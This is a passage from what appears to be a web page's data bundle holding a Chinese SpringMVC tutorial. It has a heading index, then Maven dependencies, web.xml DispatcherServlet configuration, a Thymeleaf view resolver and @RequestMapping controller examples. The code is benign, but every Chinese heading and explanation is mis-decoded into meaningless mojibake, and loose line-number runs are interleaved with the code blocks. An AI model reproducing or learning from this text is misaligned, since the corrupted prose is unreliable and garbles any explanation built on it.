¼çè·¯å¾",charIndex:9709},{level:3,title:"SpringMVCæ¯æè·¯å¾ä¸­çå ä½ç¬¦",slug:"springmvcæ¯æè·¯å¾ä¸­çå ä½ç¬¦",normalizedTitle:"springmvcæ¯æè·¯å¾ä¸­çå ä½ç¬¦",charIndex:9805},{level:2,title:"SpringMVCè·åè¯·æ±åæ°",slug:"springmvcè·åè¯·æ±åæ°",normalizedTitle:"springmvcè·åè¯·æ±åæ°",charIndex:10378},{level:3,title:"éè¿ServletAPIè·å",slug:"éè¿servletapiè·å",normalizedTitle:"éè¿servletapiè·å",charIndex:10398},{level:3,title:"éè¿æ§å¶å¨æ¹æ³çå½¢åè·åè¯·æ±åæ°",slug:"éè¿æ§å¶å¨æ¹æ³çå½¢åè·åè¯·æ±åæ°",normalizedTitle:"éè¿æ§å¶å¨æ¹æ³çå½¢åè·åè¯·æ±åæ°",charIndex:10954},{level:3,title:"@RequestParam",slug:"requestparam",normalizedTitle:"@requestparam",charIndex:11533},{level:3,title:"@RequestHeader",slug:"requestheader",normalizedTitle:"@requestheader",charIndex:11941},{level:3,title:"@CookieValue",slug:"cookievalue",normalizedTitle:"@cookievalue",charIndex:12067},{level:3,title:"éè¿POJOè·åè¯·æ±åæ°",slug:"éè¿pojoè·åè¯·æ±åæ°",normalizedTitle:"éè¿pojoè·åè¯·æ±åæ°",charIndex:12190},{level:3,title:"è§£å³è·åè¯·æ±åæ°çä¹±ç é®é¢",slug:"è§£å³è·åè¯·æ±åæ°çä¹±ç é®é¢",normalizedTitle:"è§£å³è·åè¯·æ±åæ°çä¹±ç é®é¢",charIndex:12828},{level:2,title:"åå¯¹è±¡å±äº«æ°æ®",slug:"åå¯¹è±¡å±äº«æ°æ®",normalizedTitle:"åå¯¹è±¡å±äº«æ°æ®",charIndex:13476},{level:3,title:"ä½¿ç¨ServletAPIårequeståå¯¹è±¡å±äº«æ°æ®",slug:"ä½¿ç¨servletapiårequeståå¯¹è±¡å±äº«æ°æ®",normalizedTitle:"ä½¿ç¨servletapiårequeståå¯¹è±¡å±äº«æ°æ®",charIndex:13488},{level:3,title:"ä½¿ç¨ModelAndViewårequeståå¯¹è±¡å±äº«æ°æ®",slug:"ä½¿ç¨modelandviewårequeståå¯¹è±¡å±äº«æ°æ®",normalizedTitle:"ä½¿ç¨modelandviewårequeståå¯¹è±¡å±äº«æ°æ®",charIndex:13711},{level:3,title:"ä½¿ç¨Modelårequeståå¯¹è±¡å±äº«æ°æ®",slug:"ä½¿ç¨modelårequeståå¯¹è±¡å±äº«æ°æ®",normalizedTitle:"ä½¿ç¨modelårequeståå¯¹è±¡å±äº«æ°æ®",charIndex:14022},{level:3,title:"ä½¿ç¨mapårequeståå¯¹è±¡å±äº«æ°æ®",slug:"ä½¿ç¨mapårequeståå¯¹è±¡å±äº«æ°æ®",normalizedTitle:"ä½¿ç¨mapårequeståå¯¹è±¡å±äº«æ°æ®",charIndex:14215},{level:3,title:"ä½¿ç¨ModelMapårequeståå¯¹è±¡å±äº«æ°æ®",slug:"ä½¿ç¨modelmapårequeståå¯¹è±¡å±äº«æ°æ®",normalizedTitle:"ä½¿ç¨modelmapårequeståå¯¹è±¡å±äº«æ°æ®",charIndex:14395},{level:3,title:"ModelãModelMapãMapçå³ç³»",slug:"modelãmodelmapãmapçå³ç³»",normalizedTitle:"modelãmodelmapãmapçå³ç³»",charIndex:14593},{level:3,title:"sessionåå±äº«æ°æ®",slug:"sessionåå±äº«æ°æ®",normalizedTitle:"sessionåå±äº«æ°æ®",charIndex:14905},{level:3,title:"applicationåå±äº«æ°æ®",slug:"applicationåå±äº«æ°æ®",normalizedTitle:"applicationåå±äº«æ°æ®",charIndex:15143},{level:2,title:"SpringMVCçè§å¾",slug:"springmvcçè§å¾",normalizedTitle:"springmvcçè§å¾",charIndex:15474},{level:3,title:"ThymeleafView",slug:"thymeleafview",normalizedTitle:"thymeleafview",charIndex:4754},{level:3,title:"è½¬åè§å¾",slug:"è½¬åè§å¾",normalizedTitle:"è½¬åè§å¾",charIndex:15557},{level:3,title:"éå®åè§å¾",slug:"éå®åè§å¾",normalizedTitle:"éå®åè§å¾",charIndex:15562},{level:3,title:"è§å¾æ§å¶å¨view-controller",slug:"è§å¾æ§å¶å¨view-controller",normalizedTitle:"è§å¾æ§å¶å¨view-controller",charIndex:16625},{level:2,title:"RESTful",slug:"restful",normalizedTitle:"restful",charIndex:8506},{level:3,title:"RESTfulç®ä»",slug:"restfulç®ä»",normalizedTitle:"restfulç®ä»",charIndex:17e3},{level:3,title:"RESTfulçå®ç°",slug:"restfulçå®ç°",normalizedTitle:"restfulçå®ç°",charIndex:17541},{level:3,title:"HiddenHttpMethodFilter",slug:"hiddenhttpmethodfilter",normalizedTitle:"hiddenhttpmethodfilter",charIndex:8482},{level:3,title:"RESTfulæ¡ä¾",slug:"restfulæ¡ä¾",normalizedTitle:"restfulæ¡ä¾",charIndex:19036},{level:2,title:"HttpMessageConverter",slug:"httpmessageconverter",normalizedTitle:"httpmessageconverter",charIndex:27971},{level:3,title:"@RequestBody",slug:"requestbody",normalizedTitle:"@requestbody",charIndex:28092},{level:3,title:"RequestEntity",slug:"requestentity",normalizedTitle:"requestentity",charIndex:28125},{level:3,title:"@ResponseBody",slug:"responsebody",normalizedTitle:"@responsebody",charIndex:28108},{level:3,title:"SpringMVCå¤çjson",slug:"springmvcå¤çjson",normalizedTitle:"springmvcå¤çjson",charIndex:29790},{level:3,title:"SpringMVCå¤çajax",slug:"springmvcå¤çajax",normalizedTitle:"springmvcå¤çajax",charIndex:30387},{level:3,title:"@RestControlleræ³¨è§£",slug:"restcontrolleræ³¨è§£",normalizedTitle:"@restcontrolleræ³¨è§£",charIndex:31536},{level:3,title:"ResponseEntity",slug:"responseentity",normalizedTitle:"responseentity",charIndex:28142},{level:2,title:"æä»¶ä¸ä¼ åä¸è½½",slug:"æä»¶ä¸ä¼ åä¸è½½",normalizedTitle:"æä»¶ä¸ä¼ åä¸è½½",charIndex:31731},{level:3,title:"æä»¶ä¸è½½åè½",slug:"æä»¶ä¸è½½åè½",normalizedTitle:"æä»¶ä¸è½½åè½",charIndex:31743},{level:3,title:"æä»¶ä¸ä¼ åè½",slug:"æä»¶ä¸ä¼ åè½",normalizedTitle:"æä»¶ä¸ä¼ åè½",charIndex:32697},{level:2,title:"æ¦æªå¨",slug:"æ¦æªå¨",normalizedTitle:"æ¦æªå¨",charIndex:34030},{level:3,title:"æ¦æªå¨çéç½®",slug:"æ¦æªå¨çéç½®",normalizedTitle:"æ¦æªå¨çéç½®",charIndex:34038},{level:3,title:"æ¦æªå¨çä¸ä¸ªå¤çæ¹æ³",slug:"æ¦æªå¨çä¸ä¸ªå¤çæ¹æ³",normalizedTitle:"æ¦æªå¨çä¸ä¸ªå¤çæ¹æ³",charIndex:34593},{level:3,title:"å¤ä¸ªæ¦æªå¨çæ§è¡é¡ºåº",slug:"å¤ä¸ªæ¦æªå¨çæ§è¡é¡ºåº",normalizedTitle:"å¤ä¸ªæ¦æªå¨çæ§è¡é¡ºåº",charIndex:34820},{level:2,title:"å¼å¸¸å¤çå¨",slug:"å¼å¸¸å¤çå¨",normalizedTitle:"å¼å¸¸å¤çå¨",charIndex:35112},{level:3,title:"åºäºéç½®çå¼å¸¸å¤ç",slug:"åºäºéç½®çå¼å¸¸å¤ç",normalizedTitle:"åºäºéç½®çå¼å¸¸å¤ç",charIndex:35122},{level:3,title:"åºäºæ³¨è§£çå¼å¸¸å¤ç",slug:"åºäºæ³¨è§£çå¼å¸¸å¤ç",normalizedTitle:"åºäºæ³¨è§£çå¼å¸¸å¤ç",charIndex:35907},{level:2,title:"æ³¨è§£éç½®SpringMVC",slug:"æ³¨è§£éç½®springmvc",normalizedTitle:"æ³¨è§£éç½®springmvc",charIndex:36298},{level:2,title:"SpringMVCæ§è¡æµç¨",slug:"springmvcæ§è¡æµç¨",normalizedTitle:"springmvcæ§è¡æµç¨",charIndex:41070},{level:3,title:"SpringMVCå¸¸ç¨ç»ä»¶",slug:"springmvcå¸¸ç¨ç»ä»¶",normalizedTitle:"springmvcå¸¸ç¨ç»ä»¶",charIndex:41088},{level:3,title:"DispatcherServletåå§åè¿ç¨",slug:"dispatcherservletåå§åè¿ç¨",normalizedTitle:"dispatcherservletåå§åè¿ç¨",charIndex:41526},{level:3,title:"åå§åWebApplicationContext",slug:"åå§åwebapplicationcontext",normalizedTitle:"åå§åwebapplicationcontext",charIndex:41637},{level:3,title:"åå»ºWebApplicationContext",slug:"åå»ºwebapplicationcontext",normalizedTitle:"åå»ºwebapplicationcontext",charIndex:43365},{level:3,title:"DispatcherServletåå§åç­ç¥",slug:"dispatcherservletåå§åç­ç¥",normalizedTitle:"dispatcherservletåå§åç­ç¥",charIndex:45380},{level:3,title:"DispatcherServletè°ç¨ç»ä»¶å¤çè¯·æ±",slug:"dispatcherservletè°ç¨ç»ä»¶å¤çè¯·æ±",normalizedTitle:"dispatcherservletè°ç¨ç»ä»¶å¤çè¯·æ±",charIndex:46021},{level:3,title:"SpringMVCçæ§è¡æµç¨",slug:"springmvcçæ§è¡æµç¨",normalizedTitle:"springmvcçæ§è¡æµç¨",charIndex:56200}],headersStr:"SpringMVCç®ä» ä»ä¹æ¯MVC ä»ä¹æ¯SpringMVC SpringMVCçç¹ç¹ MVCå¼åç¯å¢æ­å»º Mavené¡¹ç®åå»º Web.xmléç½®æä»¶ åå»ºè¯·æ±æ§å¶å¨ åå»ºSpringMVCéç½®æä»¶ æµè¯ æ»ç» RequestMappingæ³¨è§£ @RequestMappingæ³¨è§£çåè½ @RequestMappingæ³¨è§£çä½ç½® @RequestMappingæ³¨è§£çvalueå±æ§ @RequestMappingæ³¨è§£çmethodå±æ§ @RequestMappingæ³¨è§£çparamså±æ§ @RequestMappingæ³¨è§£çheaderså±æ§ SpringMVCæ¯æanté£æ ¼çè·¯å¾ SpringMVCæ¯æè·¯å¾ä¸­çå ä½ç¬¦ SpringMVCè·åè¯·æ±åæ° éè¿ServletAPIè·å éè¿æ§å¶å¨æ¹æ³çå½¢åè·åè¯·æ±åæ° @RequestParam @RequestHeader @CookieValue éè¿POJOè·åè¯·æ±åæ° è§£å³è·åè¯·æ±åæ°çä¹±ç é®é¢ åå¯¹è±¡å±äº«æ°æ® ä½¿ç¨ServletAPIårequeståå¯¹è±¡å±äº«æ°æ® ä½¿ç¨ModelAndViewårequeståå¯¹è±¡å±äº«æ°æ® ä½¿ç¨Modelårequeståå¯¹è±¡å±äº«æ°æ® ä½¿ç¨mapårequeståå¯¹è±¡å±äº«æ°æ® ä½¿ç¨ModelMapårequeståå¯¹è±¡å±äº«æ°æ® ModelãModelMapãMapçå³ç³» sessionåå±äº«æ°æ® applicationåå±äº«æ°æ® SpringMVCçè§å¾ ThymeleafView è½¬åè§å¾ éå®åè§å¾ è§å¾æ§å¶å¨view-controller RESTful RESTfulç®ä» RESTfulçå®ç° HiddenHttpMethodFilter RESTfulæ¡ä¾ HttpMessageConverter @RequestBody RequestEntity @ResponseBody SpringMVCå¤çjson SpringMVCå¤çajax @RestControlleræ³¨è§£ ResponseEntity æä»¶ä¸ä¼ åä¸è½½ æä»¶ä¸è½½åè½ æä»¶ä¸ä¼ åè½ æ¦æªå¨ æ¦æªå¨çéç½® æ¦æªå¨çä¸ä¸ªå¤çæ¹æ³ å¤ä¸ªæ¦æªå¨çæ§è¡é¡ºåº å¼å¸¸å¤çå¨ åºäºéç½®çå¼å¸¸å¤ç åºäºæ³¨è§£çå¼å¸¸å¤ç æ³¨è§£éç½®SpringMVC SpringMVCæ§è¡æµç¨ SpringMVCå¸¸ç¨ç»ä»¶ DispatcherServletåå§åè¿ç¨ åå§åWebApplicationContext åå»ºWebApplicationContext DispatcherServletåå§åç­ç¥ DispatcherServletè°ç¨ç»ä»¶å¤çè¯·æ± SpringMVCçæ§è¡æµç¨",content:'# SpringMVC\n\n\n# SpringMVCç®ä»\n\n\n# ä»ä¹æ¯MVC\n\nMVCæ¯ä¸ç§è½¯ä»¶æ¶æçææ³ï¼å°è½¯ä»¶æç§æ¨¡åãè§å¾ãæ§å¶å¨æ¥åå\n\nMï¼Modelï¼æ¨¡åå±ï¼æå·¥ç¨ä¸­çJavaBeanï¼ä½ç¨æ¯å¤çæ°æ® Vï¼Viewï¼è§å¾å±ï¼æå·¥ç¨ä¸­çhtmlæjspç­é¡µé¢ï¼ä½ç¨æ¯ä¸ç¨æ·è¿è¡äº¤äºï¼å±ç¤ºæ°æ® Cï¼Controllerï¼æ§å¶å±ï¼æå·¥ç¨ä¸­çservletï¼ä½ç¨æ¯æ¥æ¶è¯·æ±åååºæµè§å¨\n\nMVCçå·¥ä½æµç¨ï¼ ç¨æ·éè¿è§å¾å±åéè¯·æ±å°æå¡å¨ï¼å¨æå¡å¨ä¸­è¯·æ±è¢«Controlleræ¥æ¶ï¼Controllerè°ç¨ç¸åºçModelå±å¤çè¯·æ±ï¼å¤çå®æ¯å°ç»æè¿åå°Controllerï¼Controlleråæ ¹æ®è¯·æ±å¤ççç»ææ¾å°ç¸åºçViewè§å¾ï¼æ¸²ææ°æ®åæç»ååºç»æµè§å¨\n\nJavaBeanåä¸ºä¸¤ç±»ï¼\n\n * ä¸ç±»ç§°ä¸ºå®ä½ç±»Beanï¼ä¸é¨å­å¨ä¸å¡æ°æ®çï¼å¦ StudentãUser ç­\n * ä¸ç±»ç§°ä¸ºä¸å¡å¤ç Beanï¼æ Service æ Dao å¯¹è±¡ï¼ä¸é¨ç¨äºå¤çä¸å¡é»è¾åæ°æ®è®¿é®ã\n\n\n# ä»ä¹æ¯SpringMVC\n\nSpringMVCæ¯Springçä¸ä¸ªåç»­äº§åï¼æ¯Springçä¸ä¸ªå­é¡¹ç® SpringMVC æ¯ Spring ä¸ºè¡¨è¿°å±å¼åæä¾çä¸æ´å¥å®å¤çè§£å³æ¹æ¡ãå¨è¡¨è¿°å±æ¡æ¶åç» StrustãWebWorkãStrust2 ç­è¯¸å¤äº§åçåä»£æ´è¿­ä¹åï¼ç®åä¸çæ®ééæ©äº SpringMVC ä½ä¸º Java EE é¡¹ç®è¡¨è¿°å±å¼åçé¦éæ¹æ¡ã\n\n> æ³¨ï¼ä¸å±æ¶æåä¸ºè¡¨è¿°å±ï¼æè¡¨ç¤ºå±ï¼ãä¸å¡é»è¾å±ãæ°æ®è®¿é®å±ï¼è¡¨è¿°å±è¡¨ç¤ºåå°é¡µé¢ååå°servlet\n\n\n# SpringMVCçç¹ç¹\n\n * Spring å®¶æåçäº§åï¼ä¸ IOC å®¹å¨ç­åºç¡è®¾æ½æ ç¼å¯¹æ¥\n * åºäºåççServletï¼éè¿äºåè½å¼ºå¤§çåç«¯æ§å¶å¨DispatcherServletï¼å¯¹è¯·æ±åååºè¿è¡ç»ä¸å¤ç\n * è¡¨è¿°å±åç»åé¢åéè¦è§£å³çé®é¢å¨æ¹ä½è¦çï¼æä¾å¨é¢è§£å³æ¹æ¡\n * ä»£ç æ¸æ°ç®æ´ï¼å¤§å¹åº¦æåå¼åæç\n * åé¨ç»ä»¶åç¨åº¦é«ï¼å¯ææå¼ç»ä»¶å³æå³ç¨ï¼æ³è¦ä»ä¹åè½éç½®ç¸åºç»ä»¶å³å¯\n * æ§è½åèï¼å°¤å¶éåç°ä»£å¤§åãè¶å¤§åäºèç½é¡¹ç®è¦æ±\n\n\n# MVCå¼åç¯å¢æ­å»º\n\n\n# Mavené¡¹ç®åå»º\n\nåå»ºMAVEN webé¡¹ç®ï¼å¼å¥MAVENä¾èµ\n\n<dependencies>\n    \x3c!-- SpringMVC --\x3e\n    <dependency>\n        <groupId>org.springframework</groupId>\n        <artifactId>spring-webmvc</artifactId>\n        <version>5.3.1</version>\n    </dependency>\n\n    \x3c!-- æ¥å¿ --\x3e\n    <dependency>\n        <groupId>ch.qos.logback</groupId>\n        <artifactId>logback-classic</artifactId>\n        <version>1.2.3</version>\n    </dependency>\n\n    \x3c!-- ServletAPI --\x3e\n    <dependency>\n        <groupId>javax.servlet</groupId>\n        <artifactId>javax.servlet-api</artifactId>\n        <version>3.1.0</version>\n        <scope>provided</scope>\n    </dependency>\n\n    \x3c!-- Spring5åThymeleafæ´åå --\x3e\n    <dependency>\n        <groupId>org.thymeleaf</groupId>\n        <artifactId>thymeleaf-spring5</artifactId>\n        <version>3.0.12.RELEASE</version>\n    </dependency>\n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\n\n# Web.xmléç½®æä»¶\n\n# é»è®¤éç½®æ¹å¼\n\næ­¤éç½®ä½ç¨ä¸ï¼SpringMVCçéç½®æä»¶é»è®¤ä½äºWEB-INFä¸ï¼é»è®¤åç§°ä¸º<servlet-name>-servlet.xmlï¼ä¾å¦ï¼ä»¥ä¸éç½®æå¯¹åºSpringMVCçéç½®æä»¶ä½äºWEB-INFä¸ï¼æä»¶åä¸ºspringMVC-servlet.xml\n\n\x3c!-- éç½®SpringMVCçåç«¯æ§å¶å¨ï¼å¯¹æµè§å¨åéçè¯·æ±ç»ä¸è¿è¡å¤ç --\x3e\n<servlet>\n    <servlet-name>springMVC</servlet-name>\n    <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\n</servlet>\n<servlet-mapping>\n    <servlet-name>springMVC</servlet-name>\n    \x3c!--\n        è®¾ç½®springMVCçæ ¸å¿æ§å¶å¨æè½å¤ççè¯·æ±çè¯·æ±è·¯å¾\n        /æå¹éçè¯·æ±å¯ä»¥æ¯/loginæ.htmlæ.jsæ.cssæ¹å¼çè¯·æ±è·¯å¾\n        ä½æ¯/ä¸è½å¹é.jspè¯·æ±è·¯å¾çè¯·æ±\n    --\x3e\n    <url-pattern>/</url-pattern>\n</servlet-mapping>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n# æ©å±éç½®æ¹å¼\n\nå¯éè¿init-paramæ ç­¾è®¾ç½®SpringMVCéç½®æä»¶çä½ç½®ååç§°ï¼éè¿load-on-startupæ ç­¾è®¾ç½®SpringMVCåç«¯æ§å¶å¨DispatcherServletçåå§åæ¶é´\n\n\x3c!-- éç½®SpringMVCçåç«¯æ§å¶å¨ï¼å¯¹æµè§å¨åéçè¯·æ±ç»ä¸è¿è¡å¤ç --\x3e\n<servlet>\n    <servlet-name>springMVC</servlet-name>\n    <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\n    \x3c!-- éè¿åå§ååæ°æå®SpringMVCéç½®æä»¶çä½ç½®ååç§° --\x3e\n    <init-param>\n        \x3c!-- contextConfigLocationä¸ºåºå®å¼ --\x3e\n        <param-name>contextConfigLocation</param-name>\n        \x3c!-- ä½¿ç¨classpath:è¡¨ç¤ºä»ç±»è·¯å¾æ¥æ¾éç½®æä»¶ï¼ä¾å¦mavenå·¥ç¨ä¸­çsrc/main/resources --\x3e\n        <param-value>classpath:springMVC.xml</param-value>\n    </init-param>\n    \x3c!-- \n         ä½ä¸ºæ¡æ¶çæ ¸å¿ç»ä»¶ï¼å¨å¯å¨è¿ç¨ä¸­æå¤§éçåå§åæä½è¦å\n        èè¿äºæä½æ¾å¨ç¬¬ä¸æ¬¡è¯·æ±æ¶ææ§è¡ä¼ä¸¥éå½±åè®¿é®éåº¦\n        å æ­¤éè¦éè¿æ­¤æ ç­¾å°å¯å¨æ§å¶DispatcherServletçåå§åæ¶é´æåå°æå¡å¨å¯å¨æ¶\n    --\x3e\n    <load-on-startup>1</load-on-startup>\n</servlet>\n<servlet-mapping>\n    <servlet-name>springMVC</servlet-name>\n    \x3c!--\n        è®¾ç½®springMVCçæ ¸å¿æ§å¶å¨æè½å¤ççè¯·æ±çè¯·æ±è·¯å¾\n        /æå¹éçè¯·æ±å¯ä»¥æ¯/loginæ.htmlæ.jsæ.cssæ¹å¼çè¯·æ±è·¯å¾\n        ä½æ¯/ä¸è½å¹é.jspè¯·æ±è·¯å¾çè¯·æ±\n    --\x3e\n    <url-pattern>/</url-pattern>\n</servlet-mapping>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n&lt;url-pattern>æ ç­¾ä¸­ä½¿ç¨/å/*çåºå«ï¼\næå¹éçè¯·æ±å¯ä»¥æ¯/loginæ.htmlæ.jsæ.cssæ¹å¼çè¯·æ±è·¯å¾ï¼ä½æ¯/ä¸è½å¹é.jspè¯·æ±è·¯å¾çè¯·æ±ãå æ­¤å°±å¯ä»¥é¿åå¨è®¿é®jspé¡µé¢æ¶ï¼è¯¥è¯·æ±è¢«DispatcherServletå¤çï¼ä»èæ¾ä¸å°ç¸åºçé¡µé¢\n/* åè½å¤å¹éææè¯·æ±ï¼ä¾å¦å¨ä½¿ç¨è¿æ»¤å¨æ¶ï¼è¥éè¦å¯¹ææè¯·æ±è¿è¡è¿æ»¤ï¼å°±éè¦ä½¿ç¨/\\*çåæ³\n\n\n1\n2\n3\n\n\n\n# åå»ºè¯·æ±æ§å¶å¨\n\nç±äºåç«¯æ§å¶å¨å¯¹æµè§å¨åéçè¯·æ±è¿è¡äºç»ä¸çå¤çï¼ä½æ¯å·ä½çè¯·æ±æä¸åçå¤çè¿ç¨ï¼å æ­¤éè¦åå»ºå¤çå·ä½è¯·æ±çç±»ï¼å³è¯·æ±æ§å¶å¨\n\nè¯·æ±æ§å¶å¨ä¸­æ¯ä¸ä¸ªå¤çè¯·æ±çæ¹æ³æä¸ºæ§å¶å¨æ¹æ³\n\nå ä¸ºSpringMVCçæ§å¶å¨ç±ä¸ä¸ªPOJOï¼æ®éçJavaç±»ï¼æä»»ï¼å æ­¤éè¦éè¿@Controlleræ³¨è§£å°å¶æ è¯ä¸ºä¸ä¸ªæ§å¶å±ç»ä»¶ï¼äº¤ç»SpringçIoCå®¹å¨ç®¡çï¼æ­¤æ¶SpringMVCæè½å¤è¯å«æ§å¶å¨çå­å¨\n\n@Controller\npublic class HelloController {\n\n}\n\n\n1\n2\n3\n4\n\n\n\n# åå»ºSpringMVCéç½®æä»¶\n\n<?xml version="1.0" encoding="UTF-8"?>\n<beans xmlns="<http://www.springframework.org/schema/beans>"\n       xmlns:xsi="<http://www.w3.org/2001/XMLSchema-instance>"\n       xmlns:context="<http://www.springframework.org/schema/context>"\n       xsi:schemaLocation="<http://www.springframework.org/schema/beans> <http://www.springframework.org/schema/beans/spring-beans.xsd>\n                            <http://www.springframework.org/schema/context> <http://www.springframework.org/schema/context/spring-context.xsd>">\n\n    <context:component-scan base-package="com.pwddd.mvc" />\n    \x3c!-- éç½®Thymeleafè§å¾è§£æå¨ --\x3e\n    <bean id="viewResolver" class="org.thymeleaf.spring5.view.ThymeleafViewResolver">\n        <property name="order" value="1"/>\n        <property name="characterEncoding" value="UTF-8"/>\n        <property name="templateEngine">\n            <bean class="org.thymeleaf.spring5.SpringTemplateEngine">\n                <property name="templateResolver">\n                    <bean class="org.thymeleaf.spring5.templateresolver.SpringResourceTemplateResolver">\n\n                        \x3c!-- è§å¾åç¼ --\x3e\n                        <property name="prefix" value="/WEB-INF/templates/"/>\n\n                        \x3c!-- è§å¾åç¼ --\x3e\n                        <property name="suffix" value=".html"/>\n                        <property name="templateMode" value="HTML5"/>\n                        <property name="characterEncoding" value="UTF-8" />\n                    </bean>\n                </property>\n            </bean>\n        </property>\n    </bean>\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\n\n# æµè¯\n\n 1. å®ç°å¯¹é¦é¡µçè®¿é® å¨è¯·æ±æ§å¶å¨ä¸­åå»ºå¤çè¯·æ±çæ¹æ³\n\n// @RequestMappingæ³¨è§£ï¼å¤çè¯·æ±åæ§å¶å¨æ¹æ³ä¹é´çæ å°å³ç³»\n// @RequestMappingæ³¨è§£çvalueå±æ§å¯ä»¥éè¿è¯·æ±å°åå¹éè¯·æ±ï¼/è¡¨ç¤ºçå½åå·¥ç¨çä¸ä¸æè·¯å¾\n// localhost:8080/springMVC/\n@RequestMapping("/")\npublic String index() {\n    //è®¾ç½®è§å¾åç§°\n    return "index";\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n 2. éè¿è¶é¾æ¥è·³è½¬å°æå®é¡µé¢ å¨ä¸»é¡µindex.htmlä¸­è®¾ç½®è¶é¾æ¥\n\n<!DOCTYPE html>\n<html lang="en" xmlns:th="<http://www.thymeleaf.org>">\n<head>\n    <meta charset="UTF-8">\n    <title>é¦é¡µ</title>\n</head>\n<body>\n    <h1>é¦é¡µ</h1>\n    <a th:href="@{/hello}">HelloWorld</a><br/>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nå¨è¯·æ±æ§å¶å¨ä¸­åå»ºå¤çè¯·æ±çæ¹æ³\n\n@RequestMapping("/hello")\npublic String HelloWorld() {\n    return "target";\n}\n\n\n1\n2\n3\n4\n\n\n\n# æ»ç»\n\næµè§å¨åéè¯·æ±ï¼è¥è¯·æ±å°åç¬¦ååç«¯æ§å¶å¨çurl-patternï¼è¯¥è¯·æ±å°±ä¼è¢«åç«¯æ§å¶å¨DispatcherServletå¤çãåç«¯æ§å¶å¨ä¼è¯»åSpringMVCçæ ¸å¿éç½®æä»¶ï¼éè¿æ«æç»ä»¶æ¾å°æ§å¶å¨ï¼å°è¯·æ±å°ååæ§å¶å¨ä¸­@RequestMappingæ³¨è§£çvalueå±æ§å¼è¿è¡å¹éï¼è¥å¹éæåï¼è¯¥æ³¨è§£ææ è¯çæ§å¶å¨æ¹æ³å°±æ¯å¤çè¯·æ±çæ¹æ³ãå¤çè¯·æ±çæ¹æ³éè¦è¿åä¸ä¸ªå­ç¬¦ä¸²ç±»åçè§å¾åç§°ï¼è¯¥è§å¾åç§°ä¼è¢«è§å¾è§£æå¨è§£æï¼å ä¸åç¼ååç¼ç»æè§å¾çè·¯å¾ï¼éè¿Thymeleafå¯¹è§å¾è¿è¡æ¸²æï¼æç»è½¬åå°è§å¾æå¯¹åºé¡µé¢\n\n\n# RequestMappingæ³¨è§£\n\n\n# @RequestMappingæ³¨è§£çåè½\n\nä»æ³¨è§£åç§°ä¸æä»¬å¯ä»¥çå°ï¼@RequestMappingæ³¨è§£çä½ç¨å°±æ¯å°è¯·æ±åå¤çè¯·æ±çæ§å¶å¨æ¹æ³å³èèµ·æ¥ï¼å»ºç«æ å°å³ç³»ã SpringMVC æ¥æ¶å°æå®çè¯·æ±ï¼å°±ä¼æ¥æ¾å°å¨æ å°å³ç³»ä¸­å¯¹åºçæ§å¶å¨æ¹æ³æ¥å¤çè¿ä¸ªè¯·æ±ã\n\n\n# @RequestMappingæ³¨è§£çä½ç½®\n\n@RequestMappingæ è¯ä¸ä¸ªç±»ï¼è®¾ç½®æ å°è¯·æ±çè¯·æ±è·¯å¾çåå§ä¿¡æ¯ @RequestMappingæ è¯ä¸ä¸ªæ¹æ³ï¼è®¾ç½®æ å°è¯·æ±è¯·æ±è·¯å¾çå·ä½ä¿¡æ¯\n\n@Controller\n@RequestMapping("/test")\npublic class RequestMappingController {\n\n    //æ­¤æ¶è¯·æ±æ å°ææ å°çè¯·æ±çè¯·æ±è·¯å¾ä¸ºï¼/test/testRequestMapping\n    @RequestMapping("/testRequestMapping")\n    public String testRequestMapping(){\n        return "success";\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# @RequestMappingæ³¨è§£çvalueå±æ§\n\n@RequestMappingæ³¨è§£çvalueå±æ§éè¿è¯·æ±çè¯·æ±å°åå¹éè¯·æ±æ å° @RequestMappingæ³¨è§£çvalueå±æ§æ¯ä¸ä¸ªå­ç¬¦ä¸²ç±»åçæ°ç»ï¼è¡¨ç¤ºè¯¥è¯·æ±æ å°è½å¤å¹éå¤ä¸ªè¯·æ±å°åæå¯¹åºçè¯·æ± @RequestMappingæ³¨è§£çvalueå±æ§å¿é¡»è®¾ç½®ï¼è³å°éè¿è¯·æ±å°åå¹éè¯·æ±æ å°\n\n<a th:href="@{/test/testRequestMapping/}" >æµè¯testRequestMapping</a><br>  \n<a th:href="@{/test/test/}" >æµè¯testRequestMapping---test</a><br>\n\n\n1\n2\n\n\n@RequestMapping(\n        value = {"/testRequestMapping", "/test"}\n)\npublic String testRequestMapping(){\n    return "success";\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# @RequestMappingæ³¨è§£çmethodå±æ§\n\n@RequestMappingæ³¨è§£çmethodå±æ§éè¿è¯·æ±çè¯·æ±æ¹å¼ï¼getæpostï¼å¹éè¯·æ±æ å° @RequestMappingæ³¨è§£çmethodå±æ§æ¯ä¸ä¸ªRequestMethodç±»åçæ°ç»ï¼è¡¨ç¤ºè¯¥è¯·æ±æ å°è½å¤å¹éå¤ç§è¯·æ±æ¹å¼çè¯·æ± è¥å½åè¯·æ±çè¯·æ±å°åæ»¡è¶³è¯·æ±æ å°çvalueå±æ§ï¼ä½æ¯è¯·æ±æ¹å¼ä¸æ»¡è¶³methodå±æ§ï¼åæµè§å¨æ¥é405ï¼Request method \'POST\' not supported\n\n<form th:action="@{/test/testMethod}" method="post" >  \n <input type="submit">  \n</form>\n\n\n1\n2\n3\n\n\n@RequestMapping(  \n value = {"/testMethod"},  \n method = RequestMethod.POST  \n)  \npublic String testMethod(){  \n return "success";  \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n> TIPSï¼ 